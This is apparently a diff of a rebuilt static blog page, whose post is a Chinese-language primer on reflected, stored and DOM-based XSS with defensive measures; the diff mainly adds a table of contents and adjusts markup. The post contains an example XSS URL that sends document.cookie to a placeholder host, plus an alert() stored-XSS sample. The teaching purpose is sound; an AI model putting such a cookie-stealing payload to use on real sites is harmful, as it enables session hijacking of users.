@@ -348,6 +348,10 @@ header {
 .post-metadata time {
 	margin-right: 1em;
 }
+
+.content-tableau {
+	background-color: #dedfd1;
+}
 body {
 	max-width: 50em;
 }
@@ -547,7 +551,7 @@ pre[class*="language-"] {
 		<header>
 			<a href="/sddtc.github.com/" class="home-link">大蜕</a>
 			<nav>
-				<h2 class="visually-hidden" id="top-level-navigation-menu">Top level navigation menu</h2>
+				<h2 class="visually-hidden">Top level navigation menu</h2>
 				<ul class="nav">
 					<li class="nav-item"><a href="/sddtc.github.com/">主页</a></li>
 					<li class="nav-item"><a href="/sddtc.github.com/tags/">标签</a></li>
@@ -561,7 +565,7 @@ pre[class*="language-"] {
 			<heading-anchors>
 				
 
-<h1 id="xss">对于简单的 XSS 攻击的概念梳理</h1>
+<h1>对于简单的 XSS 攻击的概念梳理</h1>
 
 <ul class="post-metadata">
 	<li><time datetime="2019-09-06">06 September 2019</time></li>
@@ -570,15 +574,20 @@ pre[class*="language-"] {
 </ul>
 
 <div class="page-post">
-  <h3 id="">背景</h3>
+<aside>
+  <div class="content-tableau">
+        <ul><li><a href="#%E8%83%8C%E6%99%AF">背景</a></li><li><a href="#reflected-xss">Reflected XSS</a></li><li><a href="#stored-xss">Stored XSS</a></li><li><a href="#dom-based-or-local-xss">DOM-based or local XSS</a></li></ul>
+      </div>
+</aside>
+  <h3 id="%E8%83%8C%E6%99%AF" tabindex="-1">背景</h3>
 <p>前阵子想了解一些关于XSS攻击的知识，于是在网上翻阅了一些有关XSS的概念，于是我总结了下来，今天清理电脑的时候发现这篇文章，故提交之。</p>
-<h1 id="xss-cross-site-scripting">XSS - Cross-site scripting</h1>
+<h1 id="xss---cross-site-scripting" tabindex="-1">XSS - Cross-site scripting</h1>
 <ol>
 <li>Reflected XSS（基于反射的XSS攻击）</li>
 <li>Stored XSS（基于存储的XSS攻击）</li>
 <li>DOM-based or local XSS（基于DOM或本地的XSS攻击）</li>
 </ol>
-<h2 id="reflected-xss">Reflected XSS</h2>
+<h2 id="reflected-xss" tabindex="-1">Reflected XSS</h2>
 <p>主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击</p>
 <p>例子：</p>
 <ol>
@@ -586,37 +595,37 @@ pre[class*="language-"] {
 <li>当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</li>
 <li>进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：</li>
 </ol>
-<pre class="language-markdown" tabindex="0"><code class="language-markdown">http://www.amazon.cn/search?name=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxx/get?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<pre class="language-markdown" tabindex="0"><code class="hljs language-markdown">http://www.amazon.cn/search?name=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://xxx/get?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
 PS：这个地址当然是没效的，只是举例子而已。</code></pre>
-<p>结论：
+<p>结论：<br>
 如果第3步能做成功，才是个像样的XSS攻击。</p>
 <p>开发安全措施：</p>
 <ol>
 <li>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</li>
 <li>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽</li>
 </ol>
-<h2 id="stored-xss">Stored XSS</h2>
+<h2 id="stored-xss" tabindex="-1">Stored XSS</h2>
 <p>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行</p>
 <p>例子：</p>
 <ol>
 <li>发一篇文章，里面包含了恶意脚本</li>
 </ol>
-<pre class="language-markdown" tabindex="0"><code class="language-markdown">今天天气不错啊！
+<pre class="language-markdown" tabindex="0"><code class="hljs language-markdown">今天天气不错啊！
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'handsome boy'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
 <ol start="2">
 <li>后端没有对文章进行过滤，直接保存文章内容到数据库。</li>
 <li>当其他看这篇文章的时候，包含的恶意脚本就会执行。</li>
 </ol>
 <p>因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</p>
-<p>结论：
+<p>结论：<br>
 后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。</p>
 <p>开发安全措施：</p>
 <ol>
 <li>首要是服务端要进行过滤，因为前端的校验可以被绕过。</li>
 <li>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</li>
 </ol>
-<h2 id="dom-based-or-local-xss">DOM-based or local XSS</h2>
-<p>基于DOM或本地的XSS攻击。
+<h2 id="dom-based-or-local-xss" tabindex="-1">DOM-based or local XSS</h2>
+<p>基于DOM或本地的XSS攻击。<br>
 一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>
 <p>例子：</p>
 <ol>
@@ -627,7 +636,7 @@ PS：这个地址当然是没效的，只是举例子而已。</code></pre>
 <li>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</li>
 </ol>
 <p>这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。</p>
-<p>https://www.cnblogs.com/index-html/p/wifi_hijack_3.html</p>
+<p><a href="https://www.cnblogs.com/index-html/p/wifi_hijack_3.html">https://www.cnblogs.com/index-html/p/wifi_hijack_3.html</a></p>
 
 </div>
 <ul class="links-nextprev"><li class="links-nextprev-prev">← Previous<br> <a href="/sddtc.github.com/blog/2019-08-21-dig-out-timeout-errors-on-js/">浅淡 ETIMEDOUT &amp; ESOCKETTIMEDOUT &amp; Socket hang up</a></li><li class="links-nextprev-next">Next →<br><a href="/sddtc.github.com/blog/2019-09-10-rbac-and-abac/">RBAC 与 ABAC</a></li>
@@ -654,7 +663,7 @@ PS：这个地址当然是没效的，只是举例子而已。</code></pre>
 		
 		<!-- Global site tag (gtag.js) - Google Analytics end -->
 
-		<!-- This page `/blog/2019-09-06-simple-understanding-about-xss-cors/` was built on 2026-02-15T02:38:54.793Z -->
+		<!-- This page `/blog/2019-09-06-simple-understanding-about-xss-cors/` was built on 2026-02-15T13:56:14.187Z -->
 		<script type="module" src="/sddtc.github.com/dist/UgeZB_NEmy.js"></script>
 	</body>
 </html>
